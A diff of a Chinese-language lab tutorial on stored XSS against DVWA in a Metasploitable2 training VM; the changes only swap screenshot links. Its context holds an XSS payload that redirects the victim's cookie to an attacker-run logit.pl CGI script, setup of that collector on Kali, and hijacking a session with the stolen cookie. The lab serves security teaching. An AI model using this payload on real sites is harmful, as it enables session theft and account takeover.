@@ -62,37 +62,37 @@
 
 在实验桌面中，双击 Xfce 终端，打开终端：
 
-![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2290timestamp1479374588595.png/wm)
+![此处输入图片的描述](../imgs/wm_350.png)
 
 使用 `sudo virsh start Metasploitable2` 命令即可启动我们的靶机系统虚拟机：
 
-![start-metasploit.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139532596.png/wm)
+![start-metasploit.png](../imgs/wm_351.png)
 
 稍等片刻，待得虚拟机完全启动之后我们打开桌面上的 Firefox：
 
-![open-firefox.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139552463.png/wm)
+![open-firefox.png](../imgs/wm_352.png)
 
 访问我们的靶机系统所使用的 IP 地址`192.168.122.102`：
 
-![view-metasploit-url.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139568548.png/wm)
+![view-metasploit-url.png](../imgs/wm_353.png)
 
 正常的启动靶机系统之后，我们访问其 IP 地址可以得到这样的一个页面。
 
 点击 DVMA 我们便可进入到 DVMA 的登陆页面，默认的登陆用户与密码是 admin 与 password，登陆之后便会进入这样的页面：
 
-![dvwa-index.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139587112.png/wm)
+![dvwa-index.png](../imgs/wm_354.png)
 
 为了能够进行最简单的攻击，我们会把安全默认调制最低，首先进入安全模式的调整页面：
 
-![dvwa-config-security.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139662479.png/wm)
+![dvwa-config-security.png](../imgs/wm_355.png)
 
 然后调整安全的 level 到 low：
 
-![dvwa-config-security-1.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139678741.png/wm)
+![dvwa-config-security-1.png](../imgs/wm_356.png)
 
 当看到页面的下方 Level 的显示变化后，说明修改成功了：
 
-![dvwa-config-security-proof.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139693059.png/wm)
+![dvwa-config-security-proof.png](../imgs/wm_357.png)
 
 ## 6. 存储型 XSS 初试
 
@@ -100,7 +100,7 @@
 
 点击页面中的 `XSS stored` 即可进入到 DVWA 为我们提供攻击平台：
 
-![show-stored-xss](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230497689.png/wm)
+![show-stored-xss](../imgs/wm_358.png)
 
 我们可以看到 DVWA 为我们提供了一个类似于留言板的功能。
 
@@ -108,11 +108,11 @@
 
 首先我们来测试一下，文本框是否有一些限制：
 
-![show-limit-black](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230518610.png/wm)
+![show-limit-black](../imgs/wm_359.png)
 
 可以看到标题栏与文本栏都有字数上的显示，然后我们试着发布一下：
 
-![show-test-post](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230533464.png/wm)
+![show-test-post](../imgs/wm_360.png)
 
 我们看到 URL 并没有变化，刚刚发布的信息马上就在下方显示出来，由此我们可以猜想他是通过 POST 的方式提交表单的内容，然后下方的数据显示是通过在数据库中的读取而显示出来。
 
@@ -122,11 +122,11 @@
 <script>alert("nihao,shiyanlou")</script> 
 ```
 
-![stored-xss-test](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230550563.png/wm)
+![stored-xss-test](../imgs/wm_361.png)
 
 点击 `Sign Guestbook` 提交内容之后我们发现，有弹窗出现：
 
-![stored-xss-test-result.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230563872.png/wm)
+![stored-xss-test-result.png](../imgs/wm_362.png)
 
 说明该 Web 应用同样没有对内容进行过滤，我们可以通过这样的方式执行我们的 javascript 代码。
 
@@ -140,7 +140,7 @@
 
 我们查看源代码：
 
-![stored-xss-low-source](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230582607.png/wm)
+![stored-xss-low-source](../imgs/wm_363.png)
 
 从源代码中我们可以了解到：
 
@@ -154,7 +154,7 @@
 
 通过 F12 查看页面的内容，我们可以看到;
 
-![stored-xss-low-source-comment](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230610783.png/wm)
+![stored-xss-low-source-comment](../imgs/wm_364.png)
 
 这就是存储型 XSS，相对来说比反射型 XSS 的价值更大。
 
@@ -164,7 +164,7 @@
 <script>alert(document.cookie)</script>
 ```
 
-![stored-xss-cookie-result.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230634238.png/wm)
+![stored-xss-cookie-result.png](../imgs/wm_365.png)
 
 这里还是一个弹窗，但是我把这里的 alert() 操作替换成我自己服务器上的一个 php 脚本，通过这个脚本来获取 cookie，这样价值就非常大了，可以利用这些 cookie ID 来完成中间人攻击，有时候甚至会因为程序员的不注意，让我们在获取 cookie ID 的时候甚至能够看到管理员的用户名与密码，若是这样的情况的话，价值就不言而喻了。
 
@@ -178,11 +178,11 @@
 
 为了不让之前的实验结果影响到我们，我们首先重置一下数据库，在 setup 标签中重置：
 
-![reset-db](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230652147.png/wm)
+![reset-db](../imgs/wm_366.png)
 
 当我们再次返回 xss stored 页面的时候我们便可看到刚刚的评论已经清除：
 
-![reset-db-result.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230662475.png/wm)
+![reset-db-result.png](../imgs/wm_367.png)
 
 然后我们在输入框中输入：
 
@@ -191,10 +191,10 @@ Name: shiyanlou4
 
 Message: <iframe src="http://localhost"></iframe>
 ```
-![stored-xss-iframe-test](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230675386.png/wm)
+![stored-xss-iframe-test](../imgs/wm_368.png)
 接着我们可以看到这样的效果：
 
-![stored-xss-iframe-result](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230687213.png/wm)
+![stored-xss-iframe-result](../imgs/wm_369.png)
 
 ## 8.存储型 XSS 的 MITM 攻击
 
@@ -225,7 +225,7 @@ scp logit.pl.TXT roo@kali:~/
 
 我们通过桌面的终端登陆到 kali 的虚拟机上
 
-![login-kali](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230709593.png/wm)
+![login-kali](../imgs/wm_370.png)
 
 然后我们将其放置 `/usr/lib/cgi-bin` 中，同时将其 `.TXT` 的后缀去掉：
 
@@ -233,7 +233,7 @@ scp logit.pl.TXT roo@kali:~/
  mv logit.pl.TXT /usr/lib/cgi-bin/logit.pl
 ```
 
-![mv-logit.pl](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230849077.png/wm)
+![mv-logit.pl](../imgs/wm_371.png)
 
 与此同时修改该文件的所属者、给予其执行的权限：
 
@@ -242,7 +242,7 @@ chown www-data:www-data logit.pl
 chmod 700 logit.pl
 ```
 
-![chmod-logit](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230860739.png/wm)
+![chmod-logit](../imgs/wm_372.png)
 
 此时我们便配置好了接收的脚本，然后我们开始修改 apache 相关的配置文件：
 
@@ -250,11 +250,11 @@ chmod 700 logit.pl
 vim /etc/apache2/apache2.conf
 ```
 
-![vim-config](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230874868.png/wm)
+![vim-config](../imgs/wm_373.png)
 
 进入 vim 的界面后，通过 `/Di` 我们找到配置文件访问权限的位置，按 `i` 进入插入模式：
 
-![search-config (2).png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1483079679768.png/wm)
+![search-config (2).png](../imgs/wm_374.png)
 
 我们需要再次插入刚刚我们存放脚本的 `/usr/lib/cgi-bin` 目录的访问权限，再次添加这样一些内容：
 
@@ -268,7 +268,7 @@ ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
 </Directory>
 ```
 
-![config-apache](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230897073.png/wm)
+![config-apache](../imgs/wm_375.png)
 
 添加完之后，按 `Esc` 然后输入 `:wq` 来保存配置。
 
@@ -280,17 +280,17 @@ chown www-data:www-data /var/www/logdir
 chmod 700 /var/www/logdir
 ```
 
-![mkdir-log](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230907228.png/wm)
+![mkdir-log](../imgs/wm_376.png)
 
 接着我们需要使用 `a2enmod cgi` 来启动 apache2 的 cgi 模块。
 
 配置完成后，我们便可通过 `service apache2 start`启动 apache
 
-![start-cgi-apache2](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230972896.png/wm)
+![start-cgi-apache2](../imgs/wm_377.png)
 
 成功启动之后，我们可以使用 Firefox 浏览器来访问 `http://192.168.122.101/cgi-bin/logit.pl` 来验证我们是否正确配置了：
 
-![proof-config](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230982503.png/wm)
+![proof-config](../imgs/wm_378.png)
 
 若是访问的时候出现了 404 说明刚刚我们在 apache2.conf 配置文件中添加该目录的访问配置没有成功。
 
@@ -304,30 +304,30 @@ chmod 700 /var/www/logdir
 wget http://labfile.oss.aliyuncs.com/courses/717/cookies_manager-1.14.3-fx.xpi	
 ```
 
-![download-xpi](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230993485.png/wm)
+![download-xpi](../imgs/wm_379.png)
 
 然后我们在 Firefox 中安装该插件：
 
 找到 Firefox 的设置
 
-![install-xpi-1](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231016543.png/wm)
+![install-xpi-1](../imgs/wm_380.png)
 
 然后添加本地的插件安装包：
 
-![install-xpi-2.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231034254.png/wm)
+![install-xpi-2.png](../imgs/wm_381.png)
 找到刚刚我们下载的安装文件：
 
-![install-xpi-3.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231042871.png/wm)
+![install-xpi-3.png](../imgs/wm_382.png)
 
 选择安装该插件：
 
-![install-xpi-4.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231050757.png/wm)
+![install-xpi-4.png](../imgs/wm_383.png)
 
 安装成功之后会提示我们重启浏览器，重启便是，由此我们便做好了所有的准备工作。
 
 然后我们再次进入 DVWA 为我们提供的 xss stored 环境中，上文我们提到过输入框对字数有所限制，但是对我们而言是不够的，我们需要修改一下，按 F12 打开调试工具，选择查看器，通过选择器选择我们的文本框，看到文本框相关的 HTML 代码，将 50 的限制修改到 200：
 
-![config-html](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231061803.png/wm)
+![config-html](../imgs/wm_384.png)
 
 然后我们输入这样的信息：
 
@@ -335,45 +335,45 @@ wget http://labfile.oss.aliyuncs.com/courses/717/cookies_manager-1.14.3-fx.xpi
 <SCRIPT>document.location='http://192.168.122.101/cgi-bin/logit.pl?'+document.cookie</SCRIPT>
 ```
 
-![insert-script](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231072162.png/wm)
+![insert-script](../imgs/wm_385.png)
 
 然后我们点击提交，我们会看到页面跳转到了我们接收 cookie 的地方：
 
-![show-cookie](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231085159.png/wm)
+![show-cookie](../imgs/wm_386.png)
 
 然后我们关闭浏览器，重新打开 Firefox。
 
 安装 alt 键，选择工具，选择我们刚刚安装的插件 cookie_manager:
 
-![open-manager](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231103410.png/wm)
+![open-manager](../imgs/wm_387.png)
 
 再次打开我们的 cookie_manager 会发现我们的 cookie 信息是空的，此时我们再打开 `http://192.168.122.102/dvwa` 发现会让我们登陆：
 
-![reopen-dvwa](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231123037.png/wm)
+![reopen-dvwa](../imgs/wm_388.png)
 
 此时我们再开 cookies_manager 会有两条 cookie 信息，我们清除该信息：
 
-![delet-cookie](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231140321.png/wm)
+![delet-cookie](../imgs/wm_389.png)
 
 然后添加我们刚刚的 cookie 信息，你可能会说刚刚忘了保存页面上的 cookie 信息了，没事我们的 logit.pl 脚本已经将获得的信息保存在了 `/var/www/logdir` 中了：
 
-![view-log](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231154426.png/wm)
+![view-log](../imgs/wm_390.png)
 
 通过 `less log.txt` 我们可以看到刚刚的 cookie 信息：
 
-![show-log-cookie](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231165330.png/wm)
+![show-log-cookie](../imgs/wm_391.png)
 
 然后导入我们的刚刚备份的内容：
 
-![creat-cookie-session](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231174636.png/wm)
+![creat-cookie-session](../imgs/wm_392.png)
 
-![creat-cookie-security](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231189331.png/wm)
+![creat-cookie-security](../imgs/wm_393.png)
 
 获取到多少就需要录入多少，若是实在不清楚路径，可以在清除之间查看每个值所对应的路径。
 
 此时我们在 URL 栏中输入 `http://192.168.122.102/dvwa/index.php` 我们会发现，我们居然不用登陆进入到了首页，并且我们通过 Security Level 是 low 可以看出是我们刚刚登陆的用户。
 
-![proof-mi](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231198368.png/wm)
+![proof-mi](../imgs/wm_394.png)
 
 这就是中间人攻击，在不用输入用户名、密码的情况下悄悄的登陆，本实验中跳转到获取信息的页面是为了展示，真正在攻击的时候不会跳转，要在不知不觉中偷走你的 cookie 信息。
 
@@ -402,7 +402,7 @@ Mutillidae 的环境有点问题，是使用之前我们需要修改一下配置
 
 首先使用 `ssh msfadmin@target` 登陆靶机系统（注意使用 shiyanlou 用户所在终端登陆）：
 
-![homework-ssh](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231211681.png/wm)
+![homework-ssh](../imgs/wm_395.png)
 
 紧接着修改 Mutillidae 的连接数据库配置文件：
 
@@ -412,15 +412,15 @@ vim /var/www/mutillidae/config.inc
 
 将文本中的 `$dbname = 'metasploit';` 修改为 `$dbname = 'owasp10';` 
 
-![homework-config.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231222076.png/wm)
+![homework-config.png](../imgs/wm_396.png)
 
 如此我们就可以进入 Mutillidae 中注册账户，然后登陆账户：
 
-![homework-registry.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231232097.png/wm)
+![homework-registry.png](../imgs/wm_397.png)
 
 我们可以在 Mutillidae 为我们提供的环境中做类似的实验：
 
-![homework-env.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231242102.png/wm)
+![homework-env.png](../imgs/wm_398.png)
 
 若是能够做到重新打开浏览器、录入 cookie 信息，访问页面看到登陆的用户与关闭之前的相同表示成功。
 
